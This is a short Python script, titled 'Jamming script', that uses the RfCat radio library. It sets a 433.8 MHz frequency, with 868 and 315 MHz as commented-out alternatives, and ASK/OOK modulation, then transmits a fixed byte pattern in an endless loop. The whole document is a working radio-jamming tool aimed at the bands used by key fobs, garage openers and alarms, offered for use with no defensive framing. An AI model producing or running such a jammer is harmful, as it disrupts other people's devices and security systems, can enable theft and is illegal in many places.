##Jamming script

from rflib import * 

d = RfCat()
#d.setFreq(868500000)  #868
d.setFreq(433800000)  #433.92
#d.setFreq(315300000)  #315
d.setMdmModulation(MOD_ASK_OOK)
d.setMdmDRate(4800)
#d.setMaxPower()
print("Starting")
while(1):
	d.RFxmit(b"\x84\xe7\x08\x42\x10\x84\xe7\x38\x00\x00\x00\x00\x00\x00"*10)
